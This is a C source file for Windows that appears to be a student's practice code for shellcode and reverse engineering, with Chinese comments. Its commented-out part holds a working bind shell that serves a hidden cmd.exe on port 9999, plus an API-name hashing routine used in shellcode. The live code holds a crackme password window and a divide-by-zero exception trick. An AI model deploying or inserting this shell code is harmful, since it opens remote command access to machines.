#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <WinSock2.h>
#include <windows.h>
#include "aplib.h"
#pragma comment(lib,"aPlib.lib")
#pragma comment(lib, "ws2_32.lib")
////
//int main()
//{
//	WSADATA wd{};
//	WSAStartup(0x0202, &wd);
//	SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
//	SOCKADDR_IN stService;
//	stService.sin_addr.S_un.S_addr = INADDR_ANY;
//	stService.sin_port = htons(9999);
//	stService.sin_family = AF_INET;
//	bind(sock, (LPSOCKADDR)&stService, sizeof(stService));
//	listen(sock, 5);
//	sock = accept(sock, 0, 0);
//	PROCESS_INFORMATION pi{};
//	STARTUPINFOA si{};
//	si.cb = sizeof(si);
//	si.wShowWindow = SW_HIDE;
//	si.dwFlags = STARTF_USESTDHANDLES;
//	si.hStdInput = (HANDLE)sock;
//	si.hStdOutput = (HANDLE)sock;
//	si.hStdError = (HANDLE)sock;
//	CreateProcessA(0, "C:\\Windows\\System32\\cmd.exe", 0, 0, TRUE, 0, 0, 0, &si, &pi);
//	return 0;
//}
//DWORD funck(char* pStr)
//{
//	int nNum = 0;
//	while (*pStr)
//	{
//		_asm ror nNum, 7;
//		nNum += *pStr;
//		pStr++;
//	}
//	return nNum;
//}
//
//int main()
//{
//	int i = sizeof(PROCESS_INFORMATION);
//	i = sizeof(STARTUPINFOA);
//	DWORD nn = funck("WSASocketA");
//	return 0;
//}
//struct TM
//{
//	WORD high : 12;
//	WORD low : 4;
//};
//int main()
//{
//	TM t;
//	t.high = 1;
//	t.low = 2;
//	
//	return 0;
//}
LRESULT CALLBACK wndProc(HWND hwnd, UINT msg, WPARAM w, LPARAM l)
{
	switch (msg)
	{
	case WM_CREATE:
		CreateWindowExA(0, "edit", "", WS_BORDER | WS_CHILD | WS_VISIBLE, 20, 20, 420, 30, hwnd, (HMENU)0x1001, 0, 0);
		CreateWindowExA(0, "button", "OK", WS_BORDER | WS_CHILD | WS_VISIBLE, 200, 100, 50, 30, hwnd,(HMENU)0x1002, 0, 0);
		break;
	case WM_CLOSE:
		PostQuitMessage(0);
		break;
	case WM_COMMAND:
		if (LOWORD(w) == 0x1002)
		{
			//MessageBoxA(0, 0, 0, 0);
			HWND hEdit = GetDlgItem(hwnd, 0x1001);
			char buffer[MAX_PATH]{};
			GetWindowTextA(hEdit, buffer, MAX_PATH);
			if (strcmp(buffer, "123456") == 0)
				MessageBoxA(0, "OK", 0, 0);
		}
		break;
	}
	return DefWindowProcA(hwnd, msg, w, l);
}

LONG fileterProc(
	struct _EXCEPTION_POINTERS *ExceptionInfo
)
{
	printf("回调");
	switch (ExceptionInfo->ExceptionRecord->ExceptionCode)
	{
	case EXCEPTION_INT_DIVIDE_BY_ZERO:
		printf("switch");
		ExceptionInfo->ContextRecord->Eip += 2;
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}
int main()
{
	//WNDCLASSEXA wc{};
	//wc.cbSize = sizeof(WNDCLASSEXA);
	//wc.lpszClassName = "password";
	//wc.lpfnWndProc = wndProc;
	//RegisterClassExA(&wc);
	//HWND hWnd = CreateWindowExA(0,  wc.lpszClassName, "test", WS_BORDER | WS_OVERLAPPEDWINDOW | WS_VISIBLE, 500,250, 500,200,0,0,0,0 );
	//ShowWindow(hWnd, SW_SHOW);
	//UpdateWindow(hWnd);
	//MSG msg;
	//while (GetMessageA(&msg, 0, 0, 0))
	//{
	//	TranslateMessage(&msg);
	//	DispatchMessageA(&msg);
	//}
	//SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)fileterProc);
	//_asm
	//{
	//	push eax;
	//	xor eax, eax;
	//	div eax;
	//	pop eax;
	//}
	//printf("异常被处理\n");

	return 0;
}

